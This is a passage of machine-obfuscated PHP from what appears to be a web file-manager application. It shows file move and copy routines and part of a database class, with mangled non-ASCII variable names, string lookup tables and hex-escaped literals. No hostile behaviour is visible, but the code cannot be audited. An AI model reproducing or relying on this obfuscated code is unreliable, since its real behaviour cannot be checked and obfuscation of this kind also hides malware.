$this->_move($Ñî‚ç¥¶[$èú¼¡ëÛ[193]], $—ÜÄ‚—Š, $Ú–ø¸™˜, $„º©ƒ¬Ó); } $Î­•¿Í‘ = !0; } } else { if ($ÇÜ½ˆ‡ == REPEAT_RENAME || $ÇÜ½ˆ‡ == REPEAT_RENAME_FOLDER) { $ğö…£Ï = $this->fileNameAuto($Ñ«·Ú€, $ğö…£Ï, $ÇÜ½ˆ‡, $— ìÅ÷½); $úµ…‚ıË = $this->_moveForce($†Á‚ÀÜµ, $Ñ«·Ú€, $ğö…£Ï); } else { $ã›õã³Á = $this->sourceInfoCache($—ÜÄ‚—Š); $ËúçÏÚÒ = $this->fileHistory($ã›õã³Á, $ğæŠ‡œ×[$èú¼¡ëÛ[552]], $ğæŠ‡œ×[$èú¼¡ëÛ[79]]); if ($ËúçÏÚÒ) { $„º©ƒ¬Ó[$èú¼¡ëÛ[643]][] = $ğæŠ‡œ×[$èú¼¡ëÛ[552]]; } $Î­•¿Í‘ = !0; } } if ($Î­•¿Í‘) { $„º©ƒ¬Ó[$èú¼¡ëÛ[674]] = !0; } return $úµ…‚ıË; } private function _moveForce($âÎü³ÛÉ, $‹óšïëì, $¢‹éš©„) { $å–ÄŠÒè =& $_SERVER[¼’ç§¼´]; $ˆÛàå–² = $this->sourceInfo($âÎü³ÛÉ); $Õí‘îÇá = $this->sourceInfo($‹óšïëì); $Ù¾ŸúĞ˜ = $ˆÛàå–²[$å–ÄŠÒè[496]] == $å–ÄŠÒè[91]; $ ÏÈõØ = array($å–ÄŠÒè[488] => $Õí‘îÇá[$å–ÄŠÒè[193]], $å–ÄŠÒè[666] => $Õí‘îÇá[$å–ÄŠÒè[595]] . $Õí‘îÇá[$å–ÄŠÒè[193]] . $å–ÄŠÒè[50], $å–ÄŠÒè[662] => $Õí‘îÇá[$å–ÄŠÒè[190]], $å–ÄŠÒè[663] => $Õí‘îÇá[$å–ÄŠÒè[580]], $å–ÄŠÒè[665] => USER_ID, $å–ÄŠÒè[505] => $¢‹éš©„); $‡¶¢ÙÒ = $ˆÛàå–²[$å–ÄŠÒè[190]] == SourceModel::TYPE_GROUP && $Õí‘îÇá[$å–ÄŠÒè[190]] == SourceModel::TYPE_GROUP && $ˆÛàå–²[$å–ÄŠÒè[580]] == $Õí‘îÇá[$å–ÄŠÒè[580]]; if (!$‡¶¢ÙÒ && $this->moveClearAuth) { Model($å–ÄŠÒè[578])->authClear($âÎü³ÛÉ); } $ÃÃÀñ = $ˆÛàå–²[$å–ÄŠÒè[516]] == $å–ÄŠÒè[91] && $Õí‘îÇá[$å–ÄŠÒè[516]] != $å–ÄŠÒè[91]; if ($ÃÃÀñ) { $ ÏÈõØ[$å–ÄŠÒè[515]] = 0; } if ($Ù¾ŸúĞ˜) { $ñ„˜‰› = array($å–ÄŠÒè[666] => array($å–ÄŠÒè[626], $ˆÛàå–²[$å–ÄŠÒè[595]] . $ˆÛàå–²[$å–ÄŠÒè[193]] . $å–ÄŠÒè[627])); $¨×æ¥å = $ˆÛàå–²[$å–ÄŠÒè[595]] . $ˆÛàå–²[$å–ÄŠÒè[193]] . $å–ÄŠÒè[50]; $—Ñò«Ò = $Õí‘îÇá[$å–ÄŠÒè[595]] . $Õí‘îÇá[$å–ÄŠÒè[193]] . $å–ÄŠÒè[50] . $ˆÛàå–²[$å–ÄŠÒè[193]] . $å–ÄŠÒè[50]; $÷ÆÔÓàÌ = array($å–ÄŠÒè[666] => array($å–ÄŠÒè[675], "\x72\x65\x70\x6c\x61\143\x65\x28\x70\141\x72\145\x6e\x74\x4c\x65\x76\x65\x6c\x2c\47{$¨×æ¥å}\47\x2c\47{$—Ñò«Ò}\x27\x29"), $å–ÄŠÒè[662] => $Õí‘îÇá[$å–ÄŠÒè[190]], $å–ÄŠÒè[663] => $Õí‘îÇá[$å–ÄŠÒè[580]]); if ($ÃÃÀñ) { $÷ÆÔÓàÌ[$å–ÄŠÒè[515]] = 0; } $this->where($ñ„˜‰›)->data($÷ÆÔÓàÌ)->save(); } $this->where(array($å–ÄŠÒè[502] => $âÎü³ÛÉ))->data($ ÏÈõØ)->save(); return $âÎü³ÛÉ; } private function clearShare($ªåÛò·‹, $›–µ‚) { $×ÂÅĞ¤Ú =& $_SERVER[¼’ç§¼´]; $ßº´õ™ = $this->sourceInfo($ªåÛò·‹); $ƒ“öøğÔ = $this->sourceInfo($›–µ‚); if ($ßº´õ™[$×ÂÅĞ¤Ú[580]] == $ƒ“öøğÔ[$×ÂÅĞ¤Ú[580]] && $ßº´õ™[$×ÂÅĞ¤Ú[190]] == $×ÂÅĞ¤Ú[676]) { return; } $»ì÷÷ã = array($×ÂÅĞ¤Ú[595] => array($×ÂÅĞ¤Ú[626], $ßº´õ™[$×ÂÅĞ¤Ú[595]] . $ªåÛò·‹ . $×ÂÅĞ¤Ú[627])); $¨¬Ëªõ½ = $this->field($×ÂÅĞ¤Ú[502])->where($»ì÷÷ã)->getField($×ÂÅĞ¤Ú[193], !0); if (!$¨¬Ëªõ½) { return; } $»ì÷÷ã = array($×ÂÅĞ¤Ú[193] => array($×ÂÅĞ¤Ú[7], $¨¬Ëªõ½), $×ÂÅĞ¤Ú[677] => 1); $­¬¨¢×› = Model($×ÂÅĞ¤Ú[678])->field($×ÂÅĞ¤Ú[679])->where($»ì÷÷ã)->select(); if (!$­¬¨¢×›) { return; } $­¬¨¢×› = array_to_keyvalue($­¬¨¢×›, $×ÂÅĞ¤Ú[12], $×ÂÅĞ¤Ú[679]); $»ì÷÷ã = array($×ÂÅĞ¤Ú[679] => array($×ÂÅĞ¤Ú[7], $­¬¨¢×›)); Model($×ÂÅĞ¤Ú[678])->where($»ì÷÷ã)->save(array($×ÂÅĞ¤Ú[677] => 0)); Model($×ÂÅĞ¤Ú[680])->where($»ì÷÷ã)->delete(); } public function copyFolderFromIO($ÀôÃßêº, $˜­ •á , $¶ªää•Ò, $›™Ï•ì, $³ê—İ§¶, $µÌë¬¿ = false) { $àØâ—„Ã =& $_SERVER[¼’ç§¼´]; $­ÖÍã© = array($àØâ—„Ã[644] => array(), $àØâ—„Ã[645] => array(), $àØâ—„Ã[643] => array(), $àØâ—„Ã[681] => array()); $•ù˜ìê = $µÌë¬¿ ? $µÌë¬¿ : $ÀôÃßêº->pathThis($˜­ •á ); $ĞÑ˜Ë = $this->fileNameExist($¶ªää•Ò, $•ù˜ìê); $ó­ô½ñ¸ = $this->mkdir($¶ªää•Ò, $•ù˜ìê, $›™Ï•ì); if (!$ĞÑ˜Ë || $›™Ï•ì == REPEAT_RENAME_FOLDER) { $›™Ï•ì = !1; } if ($ĞÑ˜Ë) { $this->_childrenAllMake($ĞÑ˜Ë); } Hook::trigger($àØâ—„Ã[682]); $this->_copyChildTo($ÀôÃßêº, $˜­ •á , $ó­ô½ñ¸, $›™Ï•ì, $­ÖÍã©, $³ê—İ§¶); Hook::trigger($àØâ—„Ã[683]); if ($ó­ô½ñ¸) { $this->folderSizeResetChildren($ó­ô½ñ¸); } $this->_childrenListClear(); Model($àØâ—„Ã[646])->addAll($­ÖÍã©[$àØâ—„Ã[644]], array(), !0); Model($àØâ—„Ã[647])->eventCopy($ó­ô½ñ¸); $this->saveAll($­ÖÍã©[$àØâ—„Ã[645]]); Model($àØâ—„Ã[555])->linkAdd($­ÖÍã©[$àØâ—„Ã[643]]); Model($àØâ—„Ã[555])->remove($­ÖÍã©[$àØâ—„Ã[681]]); $this->folderSizeReset($¶ªää•Ò); $this->updateModifyTime($¶ªää•Ò); return $ó­ô½ñ¸; } private function _copyChildTo($¶³•“­, $É¾³’·‘, $ú×ÍşÎ, $ÇÓĞú×, &$Ì˜£¬½, $Î¼ ÑÕ) { $´òŞ¦ö© =& $_SERVER[¼’ç§¼´]; $‰ş¹Ş»‘ = $this->sourceInfoCache($ú×ÍşÎ); $¶ºÀåŒ = $¶³•“­->listPath($É¾³’·‘); $¶ºÀåŒ = $¶ºÀåŒ ? $¶ºÀåŒ : array($´òŞ¦ö©[86] => array(), $´òŞ¦ö©[85] => array()); $ ¾–ªø = array_merge($¶ºÀåŒ[$´òŞ¦ö©[86]], $¶ºÀåŒ[$´òŞ¦ö©[85]]); $àÏ¿™é = $this->_addFiles($¶³•“­, $¶ºÀåŒ[$´òŞ¦ö©[86]], $Î¼ ÑÕ); $ÅÈ×¼¾ß = array(); foreach ($ ¾–ªø as &$ …›ëêÒ) { if (isset($àÏ¿™é[$ …›ëêÒ[$´òŞ¦ö©[32]]])) { $ …›ëêÒ = $àÏ¿™é[$ …›ëêÒ[$´òŞ¦ö©[32]]]; } $ …›ëêÒ[$´òŞ¦ö©[496]] = $ …›ëêÒ[$´òŞ¦ö©[33]] == $´òŞ¦ö©[78]; $ …›ëêÒ[$´òŞ¦ö©[497]] = substr(_get($ …›ëêÒ, $´òŞ¦ö©[169], $´òŞ¦ö©[12]), 0, 10); $ …›ëêÒ[$´òŞ¦ö©[79]] = _get($ …›ëêÒ, $´òŞ¦ö©[79], 0); $ …›ëêÒ[$´òŞ¦ö©[552]] = _get($ …›ëêÒ, $´òŞ¦ö©[552], 0); if (!isset($ …›ëêÒ[$´òŞ¦ö©[684]]) && $ …›ëêÒ[$´òŞ¦ö©[552]]) { $Ì˜£¬½[$´òŞ¦ö©[681]][] = $ …›ëêÒ[$´òŞ¦ö©[552]]; } if ($ÇÓĞú×) { $…­÷²’ = $this->fileNameExistCache($ú×ÍşÎ, $ …›ëêÒ[$´òŞ¦ö©[32]]); if ($…­÷²’) { if ($ …›ëêÒ[$´òŞ¦ö©[496]] || $ÇÓĞú× == REPEAT_SKIP) { continue; } if ($ÇÓĞú× == REPEAT_REPLACE) { $…¡òÕİç = $this->sourceInfoCache($…­÷²’); $”“ŞŒ±“ = $this->fileHistory($…¡òÕİç, $ …›ëêÒ[$´òŞ¦ö©[552]], $ …›ëêÒ[$´òŞ¦ö©[79]]); if ($”“ŞŒ±“) { $Ì˜£¬½[$´òŞ¦ö©[643]][] = $ …›ëêÒ[$´òŞ¦ö©[552]]; } continue; } else { if ($ÇÓĞú× == REPEAT_RENAME) { $ …›ëêÒ[$´òŞ¦ö©[32]] = $this->fileNameAutoCache($ú×ÍşÎ, $ …›ëêÒ[$´òŞ¦ö©[32]], $ÇÓĞú×, !1); } } } } if (!$ …›ëêÒ[$´òŞ¦ö©[496]] && $ …›ëêÒ[$´òŞ¦ö©[552]] == 0) { continue; } if (!$ …›ëêÒ[$´òŞ¦ö©[496]] && $ …›ëêÒ[$´òŞ¦ö©[552]]) { $Ì˜£¬½[$´òŞ¦ö©[643]][] = $ …›ëêÒ[$´òŞ¦ö©[552]]; } $ÅÈ×¼¾ß[] = $this->_makeItemData($ …›ëêÒ, $‰ş¹Ş»‘, $ …›ëêÒ[$´òŞ¦ö©[32]]); } unset($ …›ëêÒ); if (!empty($ÅÈ×¼¾ß)) { $this->addAll($ÅÈ×¼¾ß); $this->_childrenListSelect($ú×ÍşÎ); } $–ÖŒºó‡ = $this->_childrenList($ú×ÍşÎ); $–ÖŒºó‡ = array_to_keyvalue($–ÖŒºó‡, $´òŞ¦ö©[32]); foreach ($ ¾–ªø as $ …›ëêÒ) { $…¡òÕİç = $–ÖŒºó‡[$ …›ëêÒ[$´òŞ¦ö©[32]]]; $¤Ì ÖÁµ = $…¡òÕİç[$´òŞ¦ö©[193]]; $this->_copyApplyMeta($…¡òÕİç, $Ì˜£¬½); if ($ …›ëêÒ[$´òŞ¦ö©[33]] == $´òŞ¦ö©[78]) { $ …›ëêÒ[$´òŞ¦ö©[87]] = $¶³•“­->getPathInner($ …›ëêÒ[$´òŞ¦ö©[87]]); $this->_copyChildTo($¶³•“­, $ …›ëêÒ[$´òŞ¦ö©[87]], $¤Ì ÖÁµ, $ÇÓĞú×, $Ì˜£¬½, $Î¼ ÑÕ); } } } private function _addFiles($®­˜, $¦ºÊ§½À, $¾ôˆâòÀ) { $ÜÌÕ¶÷Î =& $_SERVER[¼’ç§¼´]; if (!$¦ºÊ§½À || count($¦ºÊ§½À) == 0) { return array(); } $‹ß±‹›Ô = array(); foreach ($¦ºÊ§½À as &$ü‹§Æô) { Hook::trigger($ÜÌÕ¶÷Î[685], $ü‹§Æô); $ü‹§Æô[$ÜÌÕ¶÷Î[87]] = $®­˜->getPathInner($ü‹§Æô[$ÜÌÕ¶÷Î[87]]); $šü…Êœ = $®­˜->hashSimple($ü‹§Æô[$ÜÌÕ¶÷Î[87]]); $¶Êİ·ò¹ = $®­˜->hashMd5($ü‹§Æô[$ÜÌÕ¶÷Î[87]]); if (strlen($¶Êİ·ò¹) > 10 && !isset($‹ß±‹›Ô[$¶Êİ·ò¹])) { $‹ß±‹›Ô[$¶Êİ·ò¹] = array(); } $ü‹§Æô[$ÜÌÕ¶÷Î[686]] = $šü…Êœ; $ü‹§Æô[$ÜÌÕ¶÷Î[558]] = $¶Êİ·ò¹; $‹ß±‹›Ô[$¶Êİ·ò¹][] =& $ü‹§Æô; if (count($‹ß±‹›Ô[$¶Êİ·ò¹]) > 1) { $ü‹§Æô[$ÜÌÕ¶÷Î[684]] = !0; } Hook::trigger($ÜÌÕ¶÷Î[687], $ü‹§Æô); } unset($ü‹§Æô); $şáÕû×½ = array($ÜÌÕ¶÷Î[558] => array($ÜÌÕ¶÷Î[7], array_keys($‹ß±‹›Ô))); $†Ì÷ö©º = Model($ÜÌÕ¶÷Î[688]); $Ô¹é¥ = $†Ì÷ö©º->where($şáÕû×½)->select(); $Ô¹é¥ = $Ô¹é¥ ? $Ô¹é¥ : array(); foreach ($Ô¹é¥ as $ÄÙË¤•İ) { if (!isset($‹ß±‹›Ô[$ÄÙË¤•İ[$ÜÌÕ¶÷Î[558]]])) { continue; } $Š“Í—Æ› = $‹ß±‹›Ô[$ÄÙË¤•İ[$ÜÌÕ¶÷Î[558]]]; foreach ($Š“Í—Æ› as &$ü‹§Æô) { $ü‹§Æô[$ÜÌÕ¶÷Î[552]] = $ÄÙË¤•İ[$ÜÌÕ¶÷Î[552]]; $ü‹§Æô[$ÜÌÕ¶÷Î[684]] = !0; } unset($ü‹§Æô); } $åôòËôâ = array(); foreach ($¦ºÊ§½À as $ß×ßœ£æ) { Hook::trigger($ÜÌÕ¶÷Î[689], $ß×ßœ£æ); if (isset($ß×ßœ£æ[$ÜÌÕ¶÷Î[684]]) && $ß×ßœ£æ[$ÜÌÕ¶÷Î[684]]) { Hook::trigger($ÜÌÕ¶÷Î[690], $ß×ßœ£æ); continue; } $§ø® Ãú = $®­˜->getPathInner($ß×ßœ£æ[$ÜÌÕ¶÷Î[87]]); $Î†±õäÃ = $†Ì÷ö©º->addFileMake($§ø® Ãú, $ß×ßœ£æ[$ÜÌÕ¶÷Î[79]], $ß×ßœ£æ[$ÜÌÕ¶÷Î[686]], $ß×ßœ£æ[$ÜÌÕ¶÷Î[558]], $ß×ßœ£æ[$ÜÌÕ¶÷Î[32]], $¾ôˆâòÀ); Hook::trigger($ÜÌÕ¶÷Î[690], $ß×ßœ£æ); if (!is_array($Î†±õäÃ)) { continue; } $åôòËôâ[] = $Î†±õäÃ; } $†Ì÷ö©º->addAll($åôòËôâ); $şáÕû×½ = array($ÜÌÕ¶÷Î[558] => array($ÜÌÕ¶÷Î[7], array_keys($‹ß±‹›Ô))); $Ô¹é¥ = $†Ì÷ö©º->where($şáÕû×½)->select(); $Ô¹é¥ = $Ô¹é¥ ? $Ô¹é¥ : array(); foreach ($Ô¹é¥ as $ÄÙË¤•İ) { if (!isset($‹ß±‹›Ô[$ÄÙË¤•İ[$ÜÌÕ¶÷Î[558]]])) { continue; } $ù‹ì˜ =& $‹ß±‹›Ô[$ÄÙË¤•İ[$ÜÌÕ¶÷Î[558]]]; foreach ($ù‹ì˜ as &$ü‹§Æô) { $ü‹§Æô[$ÜÌÕ¶÷Î[552]] = $ÄÙË¤•İ[$ÜÌÕ¶÷Î[552]]; } unset($ü‹§Æô); } $¨üÇ”‹İ = array(); foreach ($¦ºÊ§½À as $·ø­Öƒ) { $¨üÇ”‹İ[$·ø­Öƒ[$ÜÌÕ¶÷Î[32]]] = $·ø­Öƒ; } return $¨üÇ”‹İ; } } define($_SERVER[¼’ç§¼´][691], $_SERVER[¼’ç§¼´][692]); $yvenukjfdm = $_SERVER[¼’ç§¼´][693]; goto F÷±Êº‘ê²; cë„éÑ¤ìÍ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\156\x65\161" => "\74\76", "\147\x74" => "\76", "\x65\x67\164" => "\x3e\75", "\154\x74" => "\74", "\x65\154\x74" => "\74\x3d", "\x6e\157\x74\x6c\151\153\145" => "\x4e\x4f\x54\40\x4c\111\x4b\105", "\x6c\151\153\x65" => "\x4c\111\113\105", "\151\x6e" => "\111\116", "\x6e\157\x74\151\x6e" => "\x4e\117\x54\40\x49\116", "\156\x6f\x74\x20\x69\156" => "\x4e\117\x54\40\x49\116", "\142\x65\164\x77\145\x65\x6e" => "\x42\x45\124\x57\x45\105\x4e", "\156\157\x74\x62\145\164\167\145\145\x6e" => "\116\x4f\124\40\x42\105\124\127\105\105\116", "\156\x6f\x74\x20\x62\145\164\x77\145\145\156" => "\116\x4f\124\40\102\x45\124\x57\105\105\116"); protected $selectSql = "\x53\x45\114\105\103\x54\x25\104\111\123\124\111\x4e\x43\x54\x25\40\x25\106\111\105\x4c\x44\x25\40\x46\x52\117\x4d\40\45\x54\101\x42\x4c\105\x25\45\x4a\x4f\111\x4e\45\x25\127\110\x45\122\105\x25\45\x47\x52\x4f\125\120\x25\45\x48\101\126\111\116\107\x25\x25\x4f\122\104\105\122\45\45\114\111\x4d\x49\x54\45\40\45\x55\x4e\x49\117\x4e\45\x25\103\117\115\115\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $£ºº‰®æ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¼’ç§¼´][1046], $£ºº‰®æ); } public function factory($üõ°Ëä¤ = '') { $£À–á‘Ï =& $_SERVER[¼’ç§¼´]; $üõ°Ëä¤ = $this->parseConfig($üõ°Ëä¤); if (empty($üõ°Ëä¤[$£À–á‘Ï[1047]])) { think_exception(think_lang($£À–á‘Ï[1048])); } $this->dbType = ucwords(strtolower($üõ°Ëä¤[$£À–á‘Ï[1047]])); $¾¿Î†ä© = $£À–á‘Ï[1049] . $this->dbType; if (class_exists($¾¿Î†ä©)) { $ß£ÆÌ²ù = new $¾¿Î†ä©($üõ°Ëä¤); if ($£À–á‘Ï[1050] != strtolower($üõ°Ëä¤[$£À–á‘Ï[1047]])) { $ß£ÆÌ²ù->dbType = strtoupper($this->dbType); } else { $ß£ÆÌ²ù->dbType = $this->_getDsnType($üõ°Ëä¤[$£À–á‘Ï[1002]]); } } else { think_exception(think_lang($£À–á‘Ï[1051]) . $£À–á‘Ï[1052] . $¾¿Î†ä©); } return $ß£ÆÌ²ù; } public function __call($ŠıÑ¾ñ‹, $ğµÔ Ó¦) { if (method_exists($this, $ŠıÑ¾ñ‹)) { return call_user_func_array(array($this, $ŠıÑ¾ñ‹), $ğµÔ Ó¦); } } protected function _getDsnType($ËŸÙ““) { $£™Ë½ = explode($_SERVER[¼’ç§¼´][4], $ËŸÙ““); $»»æœ¨Ÿ = strtoupper(trim($£™Ë½[0])); return $»»æœ¨Ÿ; } private function parseConfig($¤Ì…ó¾í = '') { $šãÓşö¥ =& $_SERVER[¼’ç§¼´]; if (!empty($¤Ì…ó¾í) && is_string($¤Ì…ó¾í)) { $¤Ì…ó¾í = $this->parseDSN($¤Ì…ó¾í); } elseif (is_array($¤Ì…ó¾í)) { $¤Ì…ó¾í = array_change_key_case($¤Ì…ó¾í); $¤Ì…ó¾í = array($šãÓşö¥[1047] => $¤Ì…ó¾í[$šãÓşö¥[1053]], $šãÓşö¥[974] => $¤Ì…ó¾í[$šãÓşö¥[1054]], $šãÓşö¥[975] => $¤Ì…ó¾í[$šãÓşö¥[1055]], $šãÓşö¥[972] => $¤Ì…ó¾í[$šãÓşö¥[1056]], $šãÓşö¥[973] => $¤Ì…ó¾í[$šãÓşö¥[1057]], $šãÓşö¥[21] => $¤Ì…ó¾í[$šãÓşö¥[1058]], $šãÓşö¥[1002] => $¤Ì…ó¾í[$šãÓşö¥[1059]], $šãÓşö¥[17] => isset($¤Ì…ó¾í[$šãÓşö¥[1060]]) ? $¤Ì…ó¾í[$šãÓşö¥[1060]] : array()); } elseif (empty($¤Ì…ó¾í)) { if (think_config($šãÓşö¥[1061]) && $šãÓşö¥[1050] != strtolower(think_config($šãÓşö¥[1062]))) { $¤Ì…ó¾í = $this->parseDSN(think_config($šãÓşö¥[1061])); } else { $¤Ì…ó¾í = array($šãÓşö¥[1047] => think_config($šãÓşö¥[1062]), $šãÓşö¥[974] => think_config($šãÓşö¥[1063]), $šãÓşö¥[975] => think_config($šãÓşö¥[1064]), $šãÓşö¥[972] => think_config($šãÓşö¥[1065]), $šãÓşö¥[973] => think_config($šãÓşö¥[1066]), $šãÓşö¥[21] => think_config($šãÓşö¥[325]), $šãÓşö¥[1002] => think_config($šãÓşö¥[1061]), $šãÓşö¥[17] => think_config($šãÓşö¥[1067])); } } return $¤Ì…ó¾í; } protected function initConnect($ÜÎ½Ô…• = true) { if (1 == think_config($_SERVER[¼’ç§¼´][22])) { $this->_linkID = $this->multiConnect($ÜÎ½Ô…•); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $­™²î => $ÙÀ«ÆĞ¾) { $this->_linkID = $ÙÀ«ÆĞ¾; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($…¼ˆœ§ = false) { $œÉÓøÉ° =& $_SERVER[¼’ç§¼´]; static $—ÖŸúÕ = array(); static $¹…ÇùŠ¿ = -1; if (empty($—ÖŸúÕ)) { foreach ($this->config as $áŒÁÓç => $˜å‡ü•›) { $—ÖŸúÕ[$áŒÁÓç] = explode($œÉÓøÉ°[50], $˜å‡ü•›); } } if (think_config($œÉÓøÉ°[1068])) { if ($…¼ˆœ§ || think_config($œÉÓøÉ°[482]) === !0) { $½‘ĞÂÏè = floor(mt_rand(0, think_config($œÉÓøÉ°[1069]) - 1)); $¹…ÇùŠ¿ = $½‘ĞÂÏè; } else { if (is_numeric(think_config($œÉÓøÉ°[1070]))) { $½‘ĞÂÏè = think_config($œÉÓøÉ°[1070]); } else { $½‘ĞÂÏè = floor(mt_rand(think_config($œÉÓøÉ°[1069]), count($—ÖŸúÕ[$œÉÓøÉ°[972]]) - 1)); } } } else { $½‘ĞÂÏè = floor(mt_rand(0, count($—ÖŸúÕ[$œÉÓøÉ°[972]]) - 1)); $¹…ÇùŠ¿ = $½‘ĞÂÏè; } $½‘ĞÂÏè = $¹…ÇùŠ¿ !== -1 ? $¹…ÇùŠ¿ : $½‘ĞÂÏè; $ƒ±éÂó× = array($œÉÓøÉ°[974] => isset($—ÖŸúÕ[$œÉÓøÉ°[974]][$½‘ĞÂÏè]) ? $—ÖŸúÕ[$œÉÓøÉ°[974]][$½‘ĞÂÏè] : $—ÖŸúÕ[$œÉÓøÉ°[974]][0], $œÉÓøÉ°[975] => isset($—ÖŸúÕ[$œÉÓøÉ°[975]][$½‘ĞÂÏè]) ? $—ÖŸúÕ[$œÉÓøÉ°[975]][$½‘ĞÂÏè] : $—ÖŸúÕ[$œÉÓøÉ°[975]][0], $œÉÓøÉ°[972] => isset($—ÖŸúÕ[$œÉÓøÉ°[972]][$½‘ĞÂÏè]) ? $—ÖŸúÕ[$œÉÓøÉ°[972]][$½‘ĞÂÏè] : $—ÖŸúÕ[$œÉÓøÉ°[972]][0], $œÉÓøÉ°[973] => isset($—ÖŸúÕ[$œÉÓøÉ°[973]][$½‘ĞÂÏè]) ? $—ÖŸúÕ[$œÉÓøÉ°[973]][$½‘ĞÂÏè] : $—ÖŸúÕ[$œÉÓøÉ°[973]][0], $œÉÓøÉ°[21] => isset($—ÖŸúÕ[$œÉÓøÉ°[21]][$½‘ĞÂÏè]) ? $—ÖŸúÕ[$œÉÓøÉ°[21]][$½‘ĞÂÏè] : $—ÖŸúÕ[$œÉÓøÉ°[21]][0], $œÉÓøÉ°[1002] => isset($—ÖŸúÕ[$œÉÓøÉ°[1002]][$½‘ĞÂÏè]) ? $—ÖŸúÕ[$œÉÓøÉ°[1002]][$½‘ĞÂÏè] : $—ÖŸúÕ[$œÉÓøÉ°[1002]][0], $œÉÓøÉ°[17] => isset($—ÖŸúÕ[$œÉÓøÉ°[17]][$½‘ĞÂÏè]) ? $—ÖŸúÕ[$œÉÓøÉ°[17]][$½‘ĞÂÏè] : $—ÖŸúÕ[$œÉÓøÉ°[17]][0]); return $this->connect($ƒ±éÂó×, $½‘ĞÂÏè); } public function parseDSN($ŸŞ­¼Ù) { $ÃÀŸß‡µ =& $_SERVER[¼’ç§¼´]; if (empty($ŸŞ­¼Ù)) { return !1; } $‡Ê «”¾ = parse_url($ŸŞ­¼Ù); if ($‡Ê «”¾[$ÃÀŸß‡µ[207]]) { $±ÀçĞ¹† = array($ÃÀŸß‡µ[1047] => $‡Ê «”¾[$ÃÀŸß‡µ[207]], $ÃÀŸß‡µ[974] => isset($‡Ê «”¾[$ÃÀŸß‡µ[676]]) ? $‡Ê «”¾[$ÃÀŸß‡µ[676]] : $ÃÀŸß‡µ[12], $ÃÀŸß‡µ[975] => isset($‡Ê «”¾[$ÃÀŸß‡µ[1071]]) ? $‡Ê «”¾[$ÃÀŸß‡µ[1071]] : $ÃÀŸß‡µ[12], $ÃÀŸß‡µ[972] => isset($‡Ê «”¾[$ÃÀŸß‡µ[208]]) ? $‡Ê «”¾[$ÃÀŸß‡µ[208]] : $ÃÀŸß‡µ[12], $ÃÀŸß‡µ[973] => isset($‡Ê «”¾[$ÃÀŸß‡µ[209]]) ? $‡Ê «”¾[$ÃÀŸß‡µ[209]] : $ÃÀŸß‡µ[12], $ÃÀŸß‡µ[21] => isset($‡Ê «”¾[$ÃÀŸß‡µ[87]]) ? substr($‡Ê «”¾[$ÃÀŸß‡µ[87]], 1) : $ÃÀŸß‡µ[12]); } else { preg_match($ÃÀŸß‡µ[1072], trim($ŸŞ­¼Ù), $Ô‡‚¸Óª); $±ÀçĞ¹† = array($ÃÀŸß‡µ[1047] => $Ô‡‚¸Óª[1], $ÃÀŸß‡µ[974] => $Ô‡‚¸Óª[2], $ÃÀŸß‡µ[975] => $Ô‡‚¸Óª[3], $ÃÀŸß‡µ[972] => $Ô‡‚¸Óª[4], $ÃÀŸß‡µ[973] => $Ô‡‚¸Óª[5], $ÃÀŸß‡µ[21] => $Ô‡‚¸Óª[6]); } $±ÀçĞ¹†[$ÃÀŸß‡µ[1002]] = $ÃÀŸß‡µ[12]; return $±ÀçĞ¹†; } protected function debug() { $¡¼”œ°­ =& $_SERVER[¼’ç§¼´]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $¡¼”œ°­[1073]; if (think_config($¡¼”œ°­[1074])) { think_status($¡¼”œ°­[1075]); think_trace($this->queryStr . $¡¼”œ°­[1076] . think_status($¡¼”œ°­[24], $¡¼”œ°­[1075], 6) . $¡¼”œ°­[1077], $¡¼”œ°­[12], $¡¼”œ°­[1078]); } } protected function parseLock($òà‹ãª³ = false) { $¶·Êë‰ =& $_SERVER[¼’ç§¼´]; if (!$òà‹ãª³) { return $¶·Êë‰[12]; } if ($¶·Êë‰[1004] == $this->dbType) { return $¶·Êë‰[1079]; } return $¶·Êë‰[1080]; } protected function parseSet($ÑÔ¹ç†¨) { $Öï¾ÃÁ« =& $_SERVER[¼’ç§¼´]; foreach ($ÑÔ¹ç†¨ as $™À“ù÷ => $¨Å¾ú—Ç) { if (is_array($¨Å¾ú—Ç) && $Öï¾ÃÁ«[374] == $¨Å¾ú—Ç[0]) { $ãı½»ÀĞ[] = $this->parseKey($™À“ù÷) . $Öï¾ÃÁ«[517] . $¨Å¾ú—Ç[1]; } elseif (is_scalar($¨Å¾ú—Ç) || is_null($¨Å¾ú—Ç)) { $ãı½»ÀĞ[] = $this->parseKey($™À“ù÷) . $Öï¾ÃÁ«[517] . $this->parseValue($¨Å¾ú—Ç); } } return $Öï¾ÃÁ«[1081] . implode($Öï¾ÃÁ«[50], $ãı½»ÀĞ); } protected function bindParam($—ÌÍ‹³», $ùË—•‘Î) { $this->bind[$_SERVER[¼’ç§¼´][4] . $—ÌÍ‹³»] = $ùË—•‘Î; } protected function parseBind($©ÜÄê¢) { $©ÜÄê¢ = array_merge($this->bind, $©ÜÄê¢); $this->bind = array(); return $©ÜÄê¢; } function parseKey(&$ûÃşı©, $êÊâ¶®‚ = true) { if ($êÊâ¶®‚) { $ûÃşı© = $this->parseKeyCheck($ûÃşı©); } return $ûÃşı©; } function parseKeyCheck($–øÜäÍÓ) { $ö›§üˆú =& $_SERVER[¼’ç§¼´]; $–øÜäÍÓ = trim($–øÜäÍÓ); if (!preg_match($ö›§üˆú[1082], $–øÜäÍÓ)) { think_exception($ö›§üˆú[1083] . $–øÜäÍÓ); } return $–øÜäÍÓ; } protected function parseValue($ùÕÇçªû) { $Ö©¤µ =& $_SERVER[¼’ç§¼´]; if (is_string($ùÕÇçªû)) { $ùÕÇçªû = $Ö©¤µ[1043] . 